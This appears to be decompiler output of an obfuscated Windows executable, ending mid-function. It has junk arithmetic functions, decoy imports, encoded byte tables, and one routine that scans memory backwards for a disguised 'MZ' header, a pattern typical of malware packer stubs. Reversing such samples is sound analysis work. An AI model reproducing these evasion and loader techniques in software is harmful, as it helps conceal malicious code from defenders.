/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

double sub_4017D4(); // weak
void __stdcall au_jPZL_V_D__d(unsigned int, __int16);
// void __userpurge YIFUJLj_r_n_IJ(unsigned int@<esi>, unsigned int *);
void __stdcall SS_UAXmq_a_bvx(int, unsigned __int16);
void __fastcall TA_gsidq_WP_FKJsfvp(unsigned int, int, bool, unsigned int *);
void __stdcall bsh_hhuc_w(int);
void __stdcall QYRS_EIPYDNmsndYSD_A(bool);
void __stdcall ueDH_KBY_WG(__int16);
// unsigned int __userpurge jAK_D_NP_gqny__l__xtht@<eax>(unsigned int result@<eax>, unsigned int@<ebx>, unsigned int, unsigned int);
// int __usercall sub_403ACA@<eax>(_DWORD *@<eax>);
void __fastcall tzyUQPRv(int, unsigned int, int, int);
void __stdcall BBHCLQZ__TGH(char);
void __stdcall cbcs___yPDS_EDB_XB(int);
// __int16 *__usercall sub_403BCC@<eax>(unsigned int@<ebx>);
int __stdcall sub_403DE4(int, int, int);
// int __userpurge sub_403E14@<eax>(unsigned int@<ebx>, int, _DWORD *);
int __stdcall sub_403FFD(int, int, int);
// int __usercall sub_4041AB@<eax>(int@<ebp>, unsigned int@<edi>, unsigned int *@<esi>);
// unsigned int __usercall sub_404262@<eax>(int a1@<ebp>, unsigned int a2@<edi>, LONG *a3@<esi>);
// int __usercall sub_404313@<eax>(unsigned int@<edx>, unsigned int@<edi>);
int sub_40445A();
unsigned int *__fastcall sub_404585(int, unsigned int, int, int, void (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int);
int __stdcall sub_40471A(int, int);
int __fastcall sub_404C15(int, unsigned int);
// int __usercall sub_404FE4@<eax>(unsigned int@<ebx>);
// int __usercall sub_405183@<eax>(unsigned int@<ebx>);
int sub_4052FB();
int sub_405439();
// int __usercall sub_405562@<eax>(unsigned int@<ebx>);
// int __userpurge sub_40599D@<eax>(__int16@<ax>, unsigned __int16);
// int __userpurge sub_405A1D@<eax>(char@<al>, unsigned __int8);
// int __userpurge sub_405A9C@<eax>(int@<edi>, int *@<esi>, _DWORD *, unsigned int *, _DWORD *, _DWORD *, _DWORD *, _DWORD *, _DWORD *, unsigned int *);
// int __userpurge start@<eax>(unsigned int@<ebx>, int);
void __fastcall b_cw_wkqwprts_T_T__(unsigned int, int, int *, char *);
// void *__cdecl memset(void *, int Val, size_t Size);
// int __userpurge sub_4062FC@<eax>(unsigned int@<edi>, int, int, int *);
int __cdecl sub_4069C6(char *, int, int, int);
// unsigned int __userpurge km_gSHWw@<eax>(unsigned int result@<eax>, char *);
void __stdcall NP_O_BkgxXNMr__(unsigned int, __int16);
// void __userpurge _Cxmehk_(unsigned int@<ebx>, unsigned __int16, int);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *DestroyPropertySheetPage)(HPROPSHEETPAGE);
// extern int (__stdcall *ImageList_AddMasked)(HIMAGELIST himl, HBITMAP hbmImage, COLORREF crMask);
// extern int (__stdcall *ImageList_GetImageCount)(HIMAGELIST himl);
// extern BOOL (__stdcall *PathMakePrettyW)(LPWSTR pszPath);
// extern int (__stdcall *StrSpnA)(PCSTR psz, PCSTR pszSet);
// extern HBITMAP (__stdcall *CreateDIBitmap)(HDC hdc, const BITMAPINFOHEADER *pbmih, DWORD flInit, const void *pjBits, const BITMAPINFO *pbmi, UINT iUsage);
// extern HPALETTE (__stdcall *CreateHalftonePalette)(HDC hdc);
// extern BOOL (__stdcall *StretchBlt)(HDC hdcDest, int xDest, int yDest, int wDest, int hDest, HDC hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, DWORD rop);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern LONG (__stdcall *InterlockedExchangeAdd)(volatile LONG *Addend, LONG Value);
// extern BOOL (__stdcall *SetCommMask)(HANDLE hFile, DWORD dwEvtMask);
// extern BOOL (__stdcall *TransactNamedPipe)(HANDLE hNamedPipe, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *AreFileApisANSI)();
// extern LONG (__stdcall *InterlockedExchange)(volatile LONG *Target, LONG Value);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern int (__stdcall *GetDateFormatW)(LCID Locale, DWORD dwFlags, const SYSTEMTIME *lpDate, LPCWSTR lpFormat, LPWSTR lpDateStr, int cchDate);
// extern BOOL (__stdcall *IntersectRect)(LPRECT lprcDst, const RECT *lprcSrc1, const RECT *lprcSrc2);
// extern BOOL (__stdcall *MoveWindow)(HWND hWnd, int X, int Y, int nWidth, int nHeight, BOOL bRepaint);
// extern BOOL (__stdcall *GetClipCursor)(LPRECT lpRect);
// extern BOOL (__stdcall *RedrawWindow)(HWND hWnd, const RECT *lprcUpdate, HRGN hrgnUpdate, UINT flags);
// extern HICON (__stdcall *LoadIconW)(HINSTANCE hInstance, LPCWSTR lpIconName);
// extern LPWSTR (__stdcall *CharLowerW)(LPWSTR lpsz);
// extern BOOL (__stdcall *PostMessageA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern HWND (__stdcall *GetNextDlgGroupItem)(HWND hDlg, HWND hCtl, BOOL bPrevious);
// extern HWND (__stdcall *CreateDialogParamA)(HINSTANCE hInstance, LPCSTR lpTemplateName, HWND hWndParent, DLGPROC lpDialogFunc, LPARAM dwInitParam);
// extern LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern BOOL (__stdcall *ClientToScreen)(HWND hWnd, LPPOINT lpPoint);
// extern int (__cdecl *stricmp)(const char *String1, const char *String2);
void ***off_407040 = &off_40703C; // weak
void ***off_407058 = &off_407054; // weak
int (**off_407080)[459] = &off_407068; // weak
int **off_407084 = &off_407074; // weak
int dword_407090 = 0; // weak
int dword_407094 = -8243; // weak
int dword_407098 = -12323; // weak
int dword_40709C = 15917; // weak
int dword_4070A0 = 11837; // weak
int *off_4070D4[4] = { &dword_407094, &dword_407098, &dword_40709C, &dword_4070A0 }; // weak
int dword_4070EC = 0; // weak
int dword_4070F0 = 0; // weak
int dword_4070F4 = 0; // weak
int dword_407100 = 0; // weak
int dword_407104 = 0; // weak
void *off_40711C = &unk_407108; // weak
_UNKNOWN unk_4071A4; // weak
int **off_4072D8 = &off_407110; // weak
LONG Target = 126223975; // idb
int dword_4072F0 = 88433765; // weak
int dword_4072F4 = 88561524; // weak
int dword_4072F8 = 0; // weak
double (*off_4072FC)() = &sub_4017D4; // weak
int dword_407300 = 106390533; // weak
int dword_407304 = 106193926; // weak
int dword_407308 = 6624267; // weak
int dword_40730C = 15080039; // weak
int (__stdcall *off_407310)(_DWORD, _DWORD, _DWORD) = &sub_403DE4; // weak
int dword_407314 = 489240; // weak
int dword_407318 = 108336920; // weak
int dword_40731C = 395032; // weak
int dword_407320 = 124082023; // weak
__int16 word_407340[] = { -31207 }; // weak
int dword_40749C = -4109; // weak
int dword_4074B8 = 3417353; // weak
__int16 word_4074BC = -296; // weak
__int16 word_4074C4 = 24678; // weak
int dword_4074CC = 488810; // weak
int dword_4074D0 = 489335; // weak
_UNKNOWN unk_4074D4; // weak
char byte_4074D7[] = { '\b' }; // weak
int dword_4074D8 = 271366; // weak
int dword_4074EC = 0; // weak
_UNKNOWN unk_4074F0; // weak
int dword_407514 = 0; // weak
_BYTE byte_407520[4] = { -112, 0, 0, 0 }; // weak
char String2[] = "KJDjkkIDiuoif"; // idb
char String1[] = "JUDkjkKDK"; // idb
int dword_407548 = 7894550; // weak
int dword_40754C = 3479004; // weak
int dword_407550 = 144131956; // weak
int dword_407554 = 1988494392; // weak
CHAR pszSet[3] = "ks"; // idb
CHAR psz[] = "sdjlksd"; // idb
int (__cdecl *off_407580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = &sub_4069C6; // weak
int (__stdcall *off_407584)(int, int, int) = &sub_4062FC; // weak
_UNKNOWN unk_407638; // weak
_BYTE byte_407640[336] =
{
  0,
  0,
  0,
  0,
  84,
  33,
  115,
  57,
  54,
  119,
  119,
  0,
  0,
  50,
  109,
  32,
  33,
  101,
  0,
  63,
  101,
  100,
  45,
  52,
  101,
  48,
  56,
  54,
  108,
  48,
  50,
  68,
  50,
  102,
  101,
  86,
  49,
  32,
  70,
  86,
  108,
  32,
  81,
  0,
  56,
  65,
  66,
  55,
  104,
  53,
  121,
  118,
  32,
  48,
  112,
  87,
  0,
  103,
  55,
  66,
  101,
  46,
  87,
  46,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  71,
  51,
  0,
  116,
  32,
  119,
  0,
  119,
  57,
  32,
  68,
  90,
  54,
  73,
  63,
  99,
  110,
  122,
  108,
  108,
  48,
  119,
  0,
  86,
  79,
  115,
  95,
  32,
  0,
  54,
  32,
  52,
  32,
  54,
  44,
  81,
  104,
  63,
  32,
  118,
  120,
  33,
  71,
  71,
  51,
  104,
  54,
  76,
  51,
  51,
  70,
  56,
  113,
  48,
  53,
  108,
  107,
  57,
  0,
  0,
  74,
  78,
  32,
  102,
  87,
  53,
  113,
  32,
  56,
  0,
  104,
  95,
  75,
  84,
  32,
  107,
  87,
  0,
  99,
  51,
  79,
  63,
  57,
  102,
  0,
  75,
  68,
  0,
  56,
  33,
  50,
  56,
  87,
  109,
  68,
  50,
  100,
  0,
  104,
  32,
  51,
  102,
  104,
  68,
  53,
  55,
  65,
  51,
  74,
  0,
  32,
  32,
  108,
  63,
  95,
  121,
  85,
  98,
  121,
  69,
  100,
  50,
  54,
  0,
  71,
  102,
  104,
  95,
  56,
  78,
  79,
  113,
  82,
  113,
  120,
  119,
  67,
  0,
  75,
  115,
  113,
  77,
  78,
  109,
  112,
  0,
  53,
  80,
  33,
  113,
  115,
  79,
  32,
  45,
  32,
  78,
  114,
  78,
  79,
  52,
  73,
  32,
  84,
  32,
  117,
  95,
  57,
  117,
  120,
  72,
  0,
  0,
  70,
  0,
  89,
  50,
  106,
  57,
  108,
  56,
  90,
  86,
  49,
  65,
  48,
  108,
  90,
  104,
  45,
  53,
  44,
  77,
  0,
  0,
  122,
  32,
  0,
  80,
  49,
  56,
  46,
  66,
  0,
  99,
  0,
  104,
  49,
  116,
  75,
  45,
  55,
  46,
  48,
  44,
  48,
  0,
  88,
  46,
  0,
  111,
  74,
  54,
  57,
  32,
  118,
  54,
  44,
  0,
  0,
  0,
  101,
  32,
  56,
  55,
  51,
  0,
  90,
  50,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
int dword_407945 = 1052226; // weak
struct tagRECT Rect = { 1080428, 1072937, 1076596, 1057915 }; // idb
int dword_407959 = 1050974; // weak
_UNKNOWN unk_40795D; // weak
int dword_407961 = 1062066; // weak
int dword_407965 = 1063948; // weak
int dword_407969 = 1058828; // weak
_UNKNOWN unk_40796D; // weak
int dword_407971 = 1060700; // weak
int dword_407975 = 1067408; // weak
int dword_407979 = 1071157; // weak
int dword_40797D = 1067892; // weak
struct tagRECT rcDst = { 1060706, 1063181, 1077340, 1060720 }; // idb
int dword_407991 = 1072480; // weak
int dword_407995 = 1049462; // weak
DWORD BytesRead = 1076528u; // idb
int dword_40799D = 1054978; // weak
int dword_4079A1 = 1057723; // weak
struct tagSIZE sz = { 1064308, 1070412 }; // idb
WCHAR DateStr = 26288u; // idb
int dword_4079B1 = 1069037; // weak
int dword_4079B5 = 1049445; // weak
int dword_4079B9 = 1049888; // weak
int dword_4079BD = 1060468; // weak
int dword_4079C1 = 1072669; // weak
int dword_4079C5 = 1074854; // weak
int dword_4079C9 = 1079087; // weak
int dword_4079CD = 1062170; // weak
int dword_4079D1 = 1057523; // weak
int dword_4079D5 = 1064973; // weak
int dword_4079D9 = 1072252; // weak
int dword_4079DD = 1078505; // weak
int dword_4079E1 = 1066922; // weak
int dword_4079E5 = 1051578; // weak
int dword_4079E9 = 1055038; // weak
int dword_4079F1 = 1068135; // weak
int dword_4079F5 = 1061392; // weak
int dword_4079F9 = 1079771; // weak
int dword_4079FD = 1050388; // weak
int dword_407A01 = 1049801; // weak
int dword_407A05 = 1073662; // weak
int dword_407A09 = 1061908; // weak
int dword_407A0D = 1079968; // weak
int dword_407A11 = 1065665; // weak
int dword_407A15 = 1073283; // weak
int dword_407A19 = 1050749; // weak
int dword_407A1D = 1057212; // weak
int dword_407A21 = 1057700; // weak
int dword_407A25 = 1077617; // weak
int dword_407A29 = 1054769; // weak
int dword_407A2D = 1053547; // weak
_UNKNOWN unk_407A31; // weak
int dword_407A39 = 1065667; // weak
int dword_407A3D = 1074237; // weak
int *off_407B43 = &dword_407945; // weak
void *off_407B4F = (void *)0x407951; // weak
int *off_407B57 = &dword_407959; // weak
void *off_407B5B = &unk_40795D; // weak
int *off_407B5F[3] = { &dword_407961, &dword_407965, &dword_407969 }; // weak
int *off_407B67 = &dword_407969; // weak
void *off_407B6B = &unk_40796D; // weak
int *off_407B73[3] = { &dword_407975, &dword_407979, &dword_40797D }; // weak
int *off_407B77[2] = { &dword_407979, &dword_40797D }; // weak
int *off_407B7B = &dword_40797D; // weak
void *off_407B8B = (void *)0x40798D; // weak
int *off_407BAB[16] =
{
  &DateStr,
  &dword_4079B1,
  &dword_4079B5,
  &dword_4079B9,
  &dword_4079BD,
  &dword_4079C1,
  &dword_4079C5,
  &dword_4079C9,
  &dword_4079CD,
  &dword_4079D1,
  &dword_4079D5,
  &dword_4079D9,
  &dword_4079DD,
  &dword_4079E1,
  &dword_4079E5,
  &dword_4079E9
}; // weak
int *off_407BB3[14] =
{
  &dword_4079B5,
  &dword_4079B9,
  &dword_4079BD,
  &dword_4079C1,
  &dword_4079C5,
  &dword_4079C9,
  &dword_4079CD,
  &dword_4079D1,
  &dword_4079D5,
  &dword_4079D9,
  &dword_4079DD,
  &dword_4079E1,
  &dword_4079E5,
  &dword_4079E9
}; // weak
int *off_407BB7[13] =
{
  &dword_4079B9,
  &dword_4079BD,
  &dword_4079C1,
  &dword_4079C5,
  &dword_4079C9,
  &dword_4079CD,
  &dword_4079D1,
  &dword_4079D5,
  &dword_4079D9,
  &dword_4079DD,
  &dword_4079E1,
  &dword_4079E5,
  &dword_4079E9
}; // weak
int *off_407BBB[12] =
{
  &dword_4079BD,
  &dword_4079C1,
  &dword_4079C5,
  &dword_4079C9,
  &dword_4079CD,
  &dword_4079D1,
  &dword_4079D5,
  &dword_4079D9,
  &dword_4079DD,
  &dword_4079E1,
  &dword_4079E5,
  &dword_4079E9
}; // weak
int *off_407BBF[11] =
{
  &dword_4079C1,
  &dword_4079C5,
  &dword_4079C9,
  &dword_4079CD,
  &dword_4079D1,
  &dword_4079D5,
  &dword_4079D9,
  &dword_4079DD,
  &dword_4079E1,
  &dword_4079E5,
  &dword_4079E9
}; // weak
int *off_407BC3[10] =
{
  &dword_4079C5,
  &dword_4079C9,
  &dword_4079CD,
  &dword_4079D1,
  &dword_4079D5,
  &dword_4079D9,
  &dword_4079DD,
  &dword_4079E1,
  &dword_4079E5,
  &dword_4079E9
}; // weak
int *off_407BC7[9] =
{
  &dword_4079C9,
  &dword_4079CD,
  &dword_4079D1,
  &dword_4079D5,
  &dword_4079D9,
  &dword_4079DD,
  &dword_4079E1,
  &dword_4079E5,
  &dword_4079E9
}; // weak
int *off_407BD3[6] =
{
  &dword_4079D5,
  &dword_4079D9,
  &dword_4079DD,
  &dword_4079E1,
  &dword_4079E5,
  &dword_4079E9
}; // weak
int *off_407BD7[5] = { &dword_4079D9, &dword_4079DD, &dword_4079E1, &dword_4079E5, &dword_4079E9 }; // weak
int *off_407BDF[3] = { &dword_4079E1, &dword_4079E5, &dword_4079E9 }; // weak
int *off_407BE3[2] = { &dword_4079E5, &dword_4079E9 }; // weak
int *off_407BE7 = &dword_4079E9; // weak
char *off_407BEB[17] =
{
  &byte_4079ED,
  &dword_4079F1,
  &dword_4079F5,
  &dword_4079F9,
  &dword_4079FD,
  &dword_407A01,
  &dword_407A05,
  &dword_407A09,
  &dword_407A0D,
  &dword_407A11,
  &dword_407A15,
  &dword_407A19,
  &dword_407A1D,
  &dword_407A21,
  &dword_407A25,
  &dword_407A29,
  &dword_407A2D
}; // weak
int *off_407BEF[16] =
{
  &dword_4079F1,
  &dword_4079F5,
  &dword_4079F9,
  &dword_4079FD,
  &dword_407A01,
  &dword_407A05,
  &dword_407A09,
  &dword_407A0D,
  &dword_407A11,
  &dword_407A15,
  &dword_407A19,
  &dword_407A1D,
  &dword_407A21,
  &dword_407A25,
  &dword_407A29,
  &dword_407A2D
}; // weak
int *off_407BFF[12] =
{
  &dword_407A01,
  &dword_407A05,
  &dword_407A09,
  &dword_407A0D,
  &dword_407A11,
  &dword_407A15,
  &dword_407A19,
  &dword_407A1D,
  &dword_407A21,
  &dword_407A25,
  &dword_407A29,
  &dword_407A2D
}; // weak
int *off_407C07[10] =
{
  &dword_407A09,
  &dword_407A0D,
  &dword_407A11,
  &dword_407A15,
  &dword_407A19,
  &dword_407A1D,
  &dword_407A21,
  &dword_407A25,
  &dword_407A29,
  &dword_407A2D
}; // weak
int *off_407C0B[9] =
{
  &dword_407A0D,
  &dword_407A11,
  &dword_407A15,
  &dword_407A19,
  &dword_407A1D,
  &dword_407A21,
  &dword_407A25,
  &dword_407A29,
  &dword_407A2D
}; // weak
int *off_407C13[7] =
{
  &dword_407A15,
  &dword_407A19,
  &dword_407A1D,
  &dword_407A21,
  &dword_407A25,
  &dword_407A29,
  &dword_407A2D
}; // weak
int *off_407C1B[5] = { &dword_407A1D, &dword_407A21, &dword_407A25, &dword_407A29, &dword_407A2D }; // weak
int *off_407C1F[4] = { &dword_407A21, &dword_407A25, &dword_407A29, &dword_407A2D }; // weak
int *off_407C27[2] = { &dword_407A29, &dword_407A2D }; // weak
void *off_407C2F = &unk_407A31; // weak
int *off_407C33[3] = { &dword_407A35, &dword_407A39, &dword_407A3D }; // weak
int *off_407C37[2] = { &dword_407A39, &dword_407A3D }; // weak
int *off_407C3B = &dword_407A3D; // weak
void *off_407C3F = &unk_407A41; // weak
CHAR TemplateName[] = "EZP_I9YT64"; // idb
WCHAR IconName = 88u; // idb


//----- (004017D4) --------------------------------------------------------
#error "4017F9: cannot convert to microcode (funcsize=16)"

//----- (004038A8) --------------------------------------------------------
void __stdcall au_jPZL_V_D__d(unsigned int a1, __int16 a2)
{
  dword_4079F1 = dword_407945 | (unsigned __int16)dword_4079F1;
  rcDst.left += dword_4079D9;
  dword_4079B1 = (unsigned __int8)dword_4079B1 - *off_407BC7[0];
}
// 407945: using guessed type int dword_407945;
// 4079B1: using guessed type int dword_4079B1;
// 4079D9: using guessed type int dword_4079D9;
// 4079F1: using guessed type int dword_4079F1;
// 407BC7: using guessed type int *off_407BC7[9];

//----- (004038F0) --------------------------------------------------------
void __userpurge YIFUJLj_r_n_IJ(unsigned int a1@<esi>, unsigned int *a2)
{
  unsigned int v2; // [esp+4h] [ebp-20h]

  *off_407BEF[0] |= LOBYTE(rcDst.top);
  *(_DWORD *)off_407BEB[0] += dword_4079F9;
  rcDst.bottom = (__PAIR64__(rcDst.bottom, a1) - __PAIR64__(*off_407C33[0], v2)) >> 32;
}
// 403922: variable 'v2' is possibly undefined
// 4079F9: using guessed type int dword_4079F9;
// 407BEB: using guessed type char *off_407BEB[17];
// 407BEF: using guessed type int *off_407BEF[16];
// 407C33: using guessed type int *off_407C33[3];

//----- (0040392E) --------------------------------------------------------
void __stdcall SS_UAXmq_a_bvx(int a1, unsigned __int16 a2)
{
  *off_407C13[0] += (unsigned __int16)dword_4079D1;
  Rect.top = *off_407C1F[0] & LOBYTE(Rect.top);
  *off_407BB3[0] -= dword_407979;
}
// 407979: using guessed type int dword_407979;
// 4079D1: using guessed type int dword_4079D1;
// 407BB3: using guessed type int *off_407BB3[14];
// 407C13: using guessed type int *off_407C13[7];
// 407C1F: using guessed type int *off_407C1F[4];

//----- (0040396A) --------------------------------------------------------
void __fastcall TA_gsidq_WP_FKJsfvp(unsigned int a1, int a2, bool a3, unsigned int *a4)
{
  unsigned int v4; // [esp+28h] [ebp-24h]

  *(_DWORD *)off_407B5B += rcDst.left + (a1 < v4);
  *off_407BB7[0] -= dword_407975;
  dword_407991 = *(_DWORD *)off_407B6B & (unsigned __int16)dword_407991;
}
// 403970: variable 'v4' is possibly undefined
// 407975: using guessed type int dword_407975;
// 407991: using guessed type int dword_407991;
// 407B5B: using guessed type void *off_407B5B;
// 407B6B: using guessed type void *off_407B6B;
// 407BB7: using guessed type int *off_407BB7[13];

//----- (004039AA) --------------------------------------------------------
void __stdcall bsh_hhuc_w(int a1)
{
  dword_407A29 = (unsigned __int16)(dword_4079C1 & dword_407A29);
  *off_407BB7[0] -= dword_407A0D;
  dword_407A11 |= (unsigned __int8)dword_4079D1;
}
// 4079C1: using guessed type int dword_4079C1;
// 4079D1: using guessed type int dword_4079D1;
// 407A0D: using guessed type int dword_407A0D;
// 407A11: using guessed type int dword_407A11;
// 407A29: using guessed type int dword_407A29;
// 407BB7: using guessed type int *off_407BB7[13];

//----- (004039ED) --------------------------------------------------------
void __stdcall QYRS_EIPYDNmsndYSD_A(bool a1)
{
  dword_407A01 -= *off_407BB7[0];
  *(_DWORD *)&DateStr = *off_407C3B & DateStr;
  *off_407BE7 -= dword_4079DD;
}
// 4079DD: using guessed type int dword_4079DD;
// 407A01: using guessed type int dword_407A01;
// 407BB7: using guessed type int *off_407BB7[13];
// 407BE7: using guessed type int *off_407BE7;
// 407C3B: using guessed type int *off_407C3B;

//----- (00403A30) --------------------------------------------------------
void __stdcall ueDH_KBY_WG(__int16 a1)
{
  dword_4079F1 |= *off_407BD3[0];
  dword_4079B5 -= *off_407B7B;
  dword_4079A1 += *off_407BC3[0];
}
// 4079A1: using guessed type int dword_4079A1;
// 4079B5: using guessed type int dword_4079B5;
// 4079F1: using guessed type int dword_4079F1;
// 407B7B: using guessed type int *off_407B7B;
// 407BC3: using guessed type int *off_407BC3[10];
// 407BD3: using guessed type int *off_407BD3[6];

//----- (00403A76) --------------------------------------------------------
unsigned int __userpurge jAK_D_NP_gqny__l__xtht@<eax>(
        unsigned int result@<eax>,
        unsigned int a2@<ebx>,
        unsigned int a3,
        unsigned int a4)
{
  dword_4079A1 |= dword_4079D9;
  sz.cy = (__PAIR64__(LOBYTE(sz.cy), a2) - __PAIR64__(dword_4079F9, dword_407995)) >> 32;
  dword_407A1D = (__PAIR64__((unsigned __int8)dword_407A1D, dword_40799D) - __PAIR64__(*off_407B5F[0], result)) >> 32;
  return result;
}
// 407995: using guessed type int dword_407995;
// 40799D: using guessed type int dword_40799D;
// 4079A1: using guessed type int dword_4079A1;
// 4079D9: using guessed type int dword_4079D9;
// 4079F9: using guessed type int dword_4079F9;
// 407A1D: using guessed type int dword_407A1D;
// 407B5F: using guessed type int *off_407B5F[3];

//----- (00403ACA) --------------------------------------------------------
int __usercall sub_403ACA@<eax>(_DWORD *a1@<eax>)
{
  int result; // eax

  dword_407554 = (int)(a1 + 1);
  dword_407548 = a1[2];
  dword_40754C = a1[3];
  result = a1[4];
  dword_407550 = result;
  return result;
}
// 407548: using guessed type int dword_407548;
// 40754C: using guessed type int dword_40754C;
// 407550: using guessed type int dword_407550;
// 407554: using guessed type int dword_407554;

//----- (00403AEE) --------------------------------------------------------
void __fastcall tzyUQPRv(int a1, unsigned int a2, int a3, int a4)
{
  unsigned int v4; // [esp+4h] [ebp-20h]

  dword_407A09 += BytesRead;
  *off_407C1B[0] += LOWORD(rcDst.right) + (v4 < a2);
  dword_407961 |= (unsigned __int8)dword_4079E5;
}
// 403B0E: variable 'v4' is possibly undefined
// 407961: using guessed type int dword_407961;
// 4079E5: using guessed type int dword_4079E5;
// 407A09: using guessed type int dword_407A09;
// 407C1B: using guessed type int *off_407C1B[5];

//----- (00403B39) --------------------------------------------------------
void __stdcall BBHCLQZ__TGH(char a1)
{
  unsigned int v1; // [esp+28h] [ebp-24h]

  Rect.left ^= *off_407BC7[0];
  dword_407965 = (__PAIR64__((unsigned __int8)dword_407965, (unsigned int)off_407BC7[0]) - __PAIR64__(
                                                                                             *off_407B73[0],
                                                                                             v1)) >> 32;
  *off_407C1F[0] += dword_4079B1 + (Rect.left < (unsigned int)dword_407991);
}
// 403B63: variable 'v1' is possibly undefined
// 407965: using guessed type int dword_407965;
// 407991: using guessed type int dword_407991;
// 4079B1: using guessed type int dword_4079B1;
// 407B73: using guessed type int *off_407B73[3];
// 407BC7: using guessed type int *off_407BC7[9];
// 407C1F: using guessed type int *off_407C1F[4];

//----- (00403B83) --------------------------------------------------------
void __stdcall cbcs___yPDS_EDB_XB(int a1)
{
  Rect.left += *(_DWORD *)off_407B4F;
  dword_4079C1 = *off_407BDF[0] & (unsigned __int16)dword_4079C1;
  dword_40797D = (unsigned __int8)dword_407A1D ^ (unsigned __int16)dword_40797D;
}
// 40797D: using guessed type int dword_40797D;
// 4079C1: using guessed type int dword_4079C1;
// 407A1D: using guessed type int dword_407A1D;
// 407B4F: using guessed type void *off_407B4F;
// 407BDF: using guessed type int *off_407BDF[3];

//----- (00403BCC) --------------------------------------------------------
__int16 *__usercall sub_403BCC@<eax>(unsigned int a1@<ebx>)
{
  int v1; // eax
  int v2; // eax
  unsigned __int16 i; // ax
  __int16 v4; // ax
  unsigned int v6; // [esp+14h] [ebp-44h]
  __int16 v7; // [esp+18h] [ebp-40h]
  int v8; // [esp+18h] [ebp-40h]
  int v9; // [esp+20h] [ebp-38h]
  int v10; // [esp+24h] [ebp-34h]
  int v11; // [esp+28h] [ebp-30h]
  int v12; // [esp+2Ch] [ebp-2Ch]
  int v13; // [esp+2Ch] [ebp-2Ch]
  RECT *lprcSrc1; // [esp+30h] [ebp-28h]
  int v15; // [esp+34h] [ebp-24h] BYREF
  int v16; // [esp+3Ch] [ebp-1Ch]
  RECT *lprcSrc2; // [esp+40h] [ebp-18h]
  _WORD *v18; // [esp+4Ch] [ebp-Ch] BYREF
  __int16 **v19; // [esp+50h] [ebp-8h]
  int v20; // [esp+54h] [ebp-4h]

  v19 = (__int16 **)4;
  v1 = v20;
  dword_407A19 = 0;
  do
  {
    if ( ++dword_407A19 == 29 )
      v1 = IntersectRect(&rcDst, lprcSrc1, lprcSrc2);
  }
  while ( (unsigned int)dword_407A19 < 0x19 );
  lprcSrc2 = (RECT *)3337;
  v2 = v20 ^ v1;
  if ( v12 <= 13920 )
  {
    v9 += dword_407991 + ((unsigned int)v12 < 0x3660);
  }
  else
  {
    v12 = (int)&v15;
    v15 += v10;
  }
  v8 = (unsigned __int16)(dword_4079C1 & v7);
  v20 = v2 + 1;
  dword_4079C5 = *off_407BE3[0] + (unsigned __int8)dword_4079C5;
  v20 = (v2 + 1) << (char)v19;
  Rect.bottom >>= 1;
  v20 <<= (char)v19;
  v20 <<= (char)v19;
  dword_407A21 ^= v6;
  v20 <<= (char)v19;
  v13 = (v10 - (unsigned __int16)v6) & v12;
  v19 = (__int16 **)**off_407040;
  lprcSrc2 = (RECT *)(*off_407BAB[0] | (unsigned int)lprcSrc2);
  v18 = (_WORD *)((unsigned int)*v19 & ~(v20 - 1));
  v19 = &v18;
  rcDst.bottom = (__PAIR64__(rcDst.bottom, 815) - __PAIR64__(v6, a1)) >> 32;
  for ( i = *v18 - 558; (i ^ 0x32F) != 23344; i = v4 - 558 )
  {
    v8 -= dword_4079C9;
    *v19 = (__int16 *)((char *)*v19 - v20);
    v4 = **v19;
    if ( v13 - 20712 >= 0 )
      v16 |= (unsigned int)lprcSrc1;
    else
      v11 -= v9;
  }
  return *v19;
}
// 403C0B: variable 'lprcSrc1' is possibly undefined
// 403C62: variable 'v12' is possibly undefined
// 403C78: variable 'v10' is possibly undefined
// 403C89: variable 'v9' is possibly undefined
// 403C9D: variable 'v7' is possibly undefined
// 403D0E: variable 'v6' is possibly undefined
// 403DAB: variable 'v11' is possibly undefined
// 407040: using guessed type void ***off_407040;
// 407961: using guessed type int dword_407961;
// 407991: using guessed type int dword_407991;
// 4079C1: using guessed type int dword_4079C1;
// 4079C5: using guessed type int dword_4079C5;
// 4079C9: using guessed type int dword_4079C9;
// 407A19: using guessed type int dword_407A19;
// 407A21: using guessed type int dword_407A21;
// 407BAB: using guessed type int *off_407BAB[16];
// 407BE3: using guessed type int *off_407BE3[2];
// 407BE7: using guessed type int *off_407BE7;

//----- (00403DE4) --------------------------------------------------------
int __stdcall sub_403DE4(int a1, int a2, int a3)
{
  dword_407094 = 7755638;
  dword_407098 = 9986422;
  dword_40709C = 4527159;
  dword_4070A0 = 15230823;
  return 8865380;
}
// 407094: using guessed type int dword_407094;
// 407098: using guessed type int dword_407098;
// 40709C: using guessed type int dword_40709C;
// 4070A0: using guessed type int dword_4070A0;

//----- (00403E14) --------------------------------------------------------
int __userpurge sub_403E14@<eax>(unsigned int a1@<ebx>, int a2, _DWORD *a3)
{
  int v3; // eax
  int v4; // eax
  HDC hdc; // [esp+24h] [ebp-18h]
  UINT uValue; // [esp+2Ch] [ebp-10h]
  UINT uValuea; // [esp+2Ch] [ebp-10h]

  for ( uValue = 0; uValue < 0x1D; ++uValue )
    ;
  Rect.right -= *off_407B77[0];
  if ( dword_4070F0 == 1 || !**(_DWORD **)(a2 + 56) )
  {
